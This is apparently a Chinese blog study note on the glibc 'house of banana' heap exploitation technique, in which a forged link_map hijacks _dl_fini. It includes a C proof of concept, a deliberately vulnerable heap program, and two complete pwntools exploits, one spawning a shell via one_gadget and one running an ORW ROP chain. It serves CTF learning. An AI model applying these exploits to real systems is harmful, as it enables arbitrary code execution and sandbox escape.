---
title: 关于house of banana的学习总结
top: 40
tags:
  - house of banana
  - large bin attack
categories: 学习总结
abbrlink: efb4678
---

## house of banana

>攻击效果：
>
>控制程序的执行流
>
>
>
>适用版本：`glibc2.23` 到目前最新的 `2.36`
>
>注意： 使用 `setcontext` 来控制寄存器打 `orw` 的话，需要在 `2.29` 版本以上才行（ `2.27` 没有办法让 `rdx` 或 `rdi` 为堆地址）
>
>
>
>利用条件：
>
>1. 可以任意地址写一个堆地址（通常使用 `large bin attack`）
>2. 能够从 `main` 函数返回或者调用 `exit` 函数
>3. 可以泄露 `libc` 地址和堆地址



### 漏洞原理

`link_map` 结构体的存储方式和堆块链表类似，是通过 `l_next` 和 `l_prev` 指针来连接的,而这个链表的头指针就是 `_rtld_global` 结构体中的 `_ns_loaded` 所存储的地址。

 如果我们可以通过 `large bin attack` 或其他方式将链表的头指针改为可控堆地址，这样就可以伪造第一个 `link_map` 结构体，从而控制结构体中的各个字段，下面代码是 `_dl_fini` 函数中的片段

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126686.png" alt="image-20230217212607337" style="zoom:50%;" />

蓝色框中是要绕过 `if` 检查所需要伪造的字段，红色框中是劫持执行流的位置。

最终的目的是需要伪造一些字段绕过检查并布局一些字段为劫持执行流做准备，最终执行到 `array[i]` 时进行劫持。





### 利用过程

首先需要恢复`l_next` 字段原本的值，这样之后的 `link_map` 就不用再伪造了。

将 `l_real` 字段改为伪造的 `link_map` 地址，以便满足 `if (l == l->l_real)` ，确保不会触发 `assert`

将 `l_info[26]` 的值设置为非空，为了满足 `if (l->l_info[DT_FINI_ARRAY] != NULL)`



如果满足这三个条件，那么就可以对 `array` 的地址进行设置，如下

```c
ElfW(Addr) *array = (ElfW(Addr) *) (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
```

为了更精准的控制 `array` ，我们控制 `l_addr` 为 `0` （事实上这个值通常也没有办法被控制，因为这个 `l_addr` 是堆块的 `prev_size`  字段，正常情况就是 `0`）

而 `DT_FINI_ARRAY` 这个宏就是 `26` ，`d_un` 则是一个联合体，定义如下

```c
  union
    {
      Elf32_Word d_val;			/* Integer value */
      Elf32_Addr d_ptr;			/* Address value */
    } d_un;
```

如果我们将 `l->l_info[26]` 的值设置为 `l->l_info[26]` 的地址，那么 `l->l_info[27]` 中的值则是 `array` 

**注意：**  `->` 操作符在 `C` 语言被定义为结构体指针成员的解引用和成员访问操作符，也就是说该操作符完成了两个操作，先对指针进行了解引用，然后再访问指针所指向的结构体成员。因此上面的代码 `l->l_info[DT_FINI_ARRAY]->d_un.d_ptr` 进行了两次解引用最后将值赋给 `array` ，而 **winmt** 师傅在 [文章](https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31) 中写到 **“以及l->l_info[26]->d_un.d_ptr，也就是l->l_info[27]”** ，这句话有点小问题，因为理解为 `l->l_info[27]` 的话，只进行了一次解引用，所以这里替 **winmt** 师傅纠正下 QAQ



接下来控制 `i` 的值，代码如下

```c
unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
```

`DT_FINI_ARRAYSZ` 这个宏是 `28` ，所以将 `l->l_info[28]` 的值设置为 `l->l_info[28]` 的地址，那么 `l->l_info[29]` 中的值再除 `8` ，则是最后的 `i`



最后的劫持位置是函数指针 `array[i]` 被调用，如下

```c
while (i-- > 0)
((fini_t) array[i]) ();
```

上面已经提到了 `array` 和 `i` 都可以被控制，因此这里可以执行代码，如果打 `one_gadget` 获取 `shell` 的话，直接布置地址即可，但是执行 `orw` 的话，需要先空走一轮函数调用，因为 `rdx` 再每轮循环后，都会被更新为堆地址（如下图）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126762.png" alt="image-20230217203244752" style="zoom:50%;" />



走空一轮的意思就是跳转到 `ret` 指令上，然后立刻退出这一轮的函数指针调用，`i--` 然后调用下一个 `array[i]` 中存放的函数指针，此时的 `rdx` 已经为堆地址了，所以此时去跳转到 `setcontext+61`  的位置，布置 `SROP` ，调用 `read` 函数再次读入 `orw` 的 `rop` 链使其正好落到 `read` 函数的返回地址上，从而绕过沙箱保护。



**补充：**

`2.27` 的 `libc` 中没办法控制寄存器走 `setcontext` ，因为其汇编如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172129364.png" alt="image-20230217212955875" style="zoom:50%;" />

对比下面这个图片（ `2.31` 的 `libc`），就会发现 `2.27` 没有 `rdi` 或者 `rdx` 被赋值为堆地址的指令,所以不好打 `orw`

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172131373.png" alt="image-20230217213154837" style="zoom: 50%;" />





### poc

```c
//gcc poc.c -o poc -w -g
//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6
#include <stdio.h>
#include <stdlib.h>
#define rtld_global_dl_ns 0x61b060
#define one_gadget 0x4f302

int main (void)
{
  
  setvbuf(stdout, 0, 2, 0);
  long long int libc_base=&printf-0x64e40;
  printf("libc base %llx\n",libc_base);
  size_t *p=malloc(0x400);
  
  p[3]=libc_base+0x61c710;//l_next
  p[5]=p;//l_real    也是伪造的link_map地址
  p[34]=&p[34];//l->l_info[26] DT_FINI_ARRAY
  p[35]=&p[38];//l->l_info[DT_FINI_ARRAY]->d_un.d_ptr    
  p[36]=&p[36];//l->l_info[DT_FINI_ARRAYSZ]
  p[37]=0x8;//i=l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
  p[38]=libc_base+one_gadget;//call array[i]
  p[0x62]=0x800000000;//使l->l_init_called 为1
  *(size_t *)(rtld_global_dl_ns+libc_base)=p;//劫持_rtld_global_ns_loaded  目的伪造link_map
  return 0;
}

```

运行结果：

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172153387.png" alt="image-20230217215313299" style="zoom: 67%;" />



## 例题

自己写了一个程序，打了一下 `house of banana` ，我先是编译完之后，对应的是 `libc2.27` ，我用 `house of banana` 劫持执行流后打的 `og` 获取了 `shell` ，然后又 `patch` 成了 `2.31-0ubuntu9_amd64` 打的 `orw` 

`C` 源码

```c
//gcc test.c -o test -w -g
//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6
#include<stdio.h> 
#include <unistd.h> 
#define num 10
void *chunk_list[num];
int chunk_size[num];

void init()
{
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	setbuf(stderr, 0);
}

void menu()
{
	puts("1.add");
	puts("2.show");
	puts("3.edit");
	puts("4.delete");
	puts("5.exit");
	puts("Your choice:");
}


int add()
{
	int index,size;
	puts("index:");
	scanf("%d",&index);
	if(index<0 || index>=num)
		exit(1);
	puts("Size:");
	scanf("%d",&size);
	if(size<0x80||size>0x500)
		exit(1);
	chunk_list[index] = calloc(size,1);
  chunk_size[index] = size;
}

int edit()
{
	int index;
	puts("index:");
	scanf("%d",&index);
	if(index<0 || index>=num)
		exit(1);
	puts("context: ");
	read(0,chunk_list[index],chunk_size[index]);
}

int delete()
{
	int index;
	puts("index:");
	scanf("%d",&index);
	if(index<0 || index>=num)
		exit(1);
		
	free(chunk_list[index]);
}

int show()
{
	int index;
	puts("index:");
	scanf("%d",&index);
	if(index<0 || index>=num)
		exit(1);
		
	puts("context: ");
	puts(chunk_list[index]);
}


int main()
{
	int choice;
	init();
	while(1){
		menu();
		scanf("%d",&choice);
		if(choice==5){
			exit(0);
		}
		else if(choice==1){
			add();
		}
		else if(choice==2){
			show();
		}
		else if(choice==3){
			edit();
		}
		else if(choice==4){
			delete();
		}
	}
}
```

正常的菜单堆，肯定是有其他解法，这里只考虑 `house of banana` ，漏洞就一个 `UAF` 。

泄露 `libc` 和堆地址之后，打 `large bin attack` ，伪造 `link_map` ，各个字段的赋值上面已经进行了说明，下面是两个 `exp`



### EXP

打 `2.27` 获取 `shell` 的 `exp`

```py
from tools import *
context.log_level='debug'
p,e,libc=load('test')

d_a=0xCFF
d_d=0xD3B
d_e=0xD27
d_s=0xD13 

def add(index,size):
	p.sendlineafter('Your choice:\n', str(1))
	p.sendlineafter('index:\n', str(index))
	p.sendlineafter("Size:\n", str(size))

def show(index):
	p.sendlineafter('Your choice:\n', str(2))
	p.sendlineafter('index:\n', str(index))

def edit(index, content):
	p.sendlineafter('Your choice:\n', str(3))
	p.sendlineafter('index:\n', str(index))
	p.sendafter("context: \n",content)

def delete(index):
	p.sendlineafter('Your choice:\n', str(4))
	p.sendlineafter('index:\n', str(index))

add(0,0x428)
add(1,0x500)
add(2,0x418)
delete(0)
add(3,0x500)

show(0)
libc_base=recv_libc()-0x3ec090
log_addr('libc_base')
edit(0,'a'*0x10)
show(0)
p.recvuntil('a'*0x10)
heap_base=u64(p.recv(6).ljust(8,b'\x00'))-0x250
log_addr('heap_base')

rtld_global=libc_base+0x61b060
one_gadget=libc_base+0x4f302
delete(2)
edit(0,p64(libc_base+0x3ec090)*2+p64(heap_base+0x250)+p64(rtld_global-0x20))
debug(p,'pie',d_d,d_a,d_e,d_s)
add(4,0x500)

link_map=p64(0)*1
link_map+=p64(libc_base+0x61c710)#l_next
link_map+=p64(0)
link_map+=p64(heap_base+0xb90)#l_real
link_map+=p64(0)*28 
link_map+=p64(heap_base+0xc08+0x98)#l->l_info[26]
link_map+=p64(heap_base+0xc08+32+0x98)#l->l_info[26]->d_un.d_ptr    
link_map+=p64(heap_base+0xc08+0x10+0x98)#l->l_info[28]
link_map+=p64(8)#//i=l->l_info[28]->d_un.d_val
link_map+=p64(one_gadget)
link_map+=p64(heap_base+0xb90)
link_map+=p64(0)*58
link_map+=p64(0x800000000)

edit(2,link_map)
p.sendlineafter('Your choice:\n', str(5))
p.interactive()
```

![image-20230217205309204](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127310.png)



打 `2.31` 走 `orw` 读出 `flag` 的 `exp`

```py
from tools import *
context.log_level='debug'
p,e,libc=load('demo')

d_a=0xCFF
d_d=0xD3B
d_e=0xD27
d_s=0xD13 

def add(index,size):
	p.sendlineafter('Your choice:\n', str(1))
	p.sendlineafter('index:\n', str(index))
	p.sendlineafter("Size:\n", str(size))

def show(index):
	p.sendlineafter('Your choice:\n', str(2))
	p.sendlineafter('index:\n', str(index))

def edit(index, content):
	p.sendlineafter('Your choice:\n', str(3))
	p.sendlineafter('index:\n', str(index))
	p.sendafter("context: \n",content)

def delete(index):
	p.sendlineafter('Your choice:\n', str(4))
	p.sendlineafter('index:\n', str(index))

add(0,0x428)
add(1,0x500)
add(2,0x418)
delete(0)
add(3,0x500)

show(0)
libc_base=recv_libc()-0x1ebfd0
log_addr('libc_base')
edit(0,'a'*0x10)

show(0)
p.recvuntil('a'*0x10)
heap_base=u64(p.recv(6).ljust(8,b'\x00'))-0x290
log_addr('heap_base')

rtld_global=libc_base+0x222060
one_gadget=libc_base+0xe6aee
ret_addr=libc_base+0x0000000000025679
setcontext=0x580DD+libc_base
pop_rdi=libc_base+0x0000000000026b72
pop_rsi=libc_base+0x0000000000027529
pop_rdx_r12=libc_base+0x000000000011c1e1
write_addr=libc_base+libc.symbols['write']
open_addr=libc_base+libc.symbols['open']

read_addr=libc.symbols['read']+libc_base
delete(2)
edit(0,p64(libc_base+0x3ec090)*2+p64(heap_base+0x290)+p64(rtld_global-0x20))

add(4,0x500)

link_map=p64(0)
link_map+=p64(libc_base+0x223740)#l_next
link_map+=p64(0)
link_map+=p64(heap_base+0xb90+0x40)#l_real
link_map+=p64(0)*28 
link_map+=p64(heap_base+0xc08+0x98+0x40)#l->l_info[26]
link_map+=p64(heap_base+0xc08+32+0x98+0x40)#l->l_info[26]->d_un.d_ptr    
link_map+=p64(heap_base+0xc08+0x10+0x98+0x40)#l->l_info[28]
link_map+=p64(0x20)#//i=l->l_info[28]->d_un.d_val
link_map+=b"flag\x00\x00\x00\x00"
link_map+=p64(heap_base+0xb90+0x40)
link_map+=p64(setcontext)
link_map+=p64(ret_addr)
link_map+=p64(0)*12
link_map+=p64(0)#rdi
link_map+=p64(heap_base+0xdc8)#rsi
link_map+=p64(0)*2
link_map+=p64(0x100)#rdx
link_map+=p64(0)*2

link_map+=p64(heap_base+0xdc8)#rsp
link_map+=p64(read_addr)#rcx


link_map+=p64(0)*36
link_map+=p64(0x800000000)
debug(p,'pie',d_d,d_a,d_e,d_s)
edit(2,link_map)
p.sendlineafter('Your choice:\n', str(5))

pause()
flag_addr=heap_base+0xd00
orw=p64(pop_rdi)+p64(flag_addr)
orw+=p64(pop_rsi)+p64(0)
orw+=p64(open_addr)
orw+=p64(pop_rdi)+p64(3)
orw+=p64(pop_rsi)+p64(heap_base)
orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)
orw+=p64(read_addr)
orw+=p64(pop_rdi)+p64(1)
orw+=p64(pop_rsi)+p64(heap_base)
orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)
orw+=p64(write_addr)
p.sendline(orw)
p.interactive()
```

![image-20230217205622280](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127529.png)



## 总结：

`house of banana` 是 `ha1vk` 师傅提出来的一种利用手法，与`house` 系列的大部分攻击 `IO_FILE` 的利用不同，`house of banana` 是攻击的 `rtld_global` 结构体，伪造 `link_map` 进行的劫持执行流，只需要进行一次 `large bin attack` 并且能调用 `exit` 函数即可触发攻击，不过在攻击远程的时候可能需要爆破 （ `ld` 和 `libc` 的偏移可能在本地和远程不固定）

## 参考文章

[[原创\] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)](https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31)

[高Glibc版本下的堆骚操作解析 (buaq.net)](https://www.buaq.net/go-85397.html)

[house of banana-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/222948#h3-5)
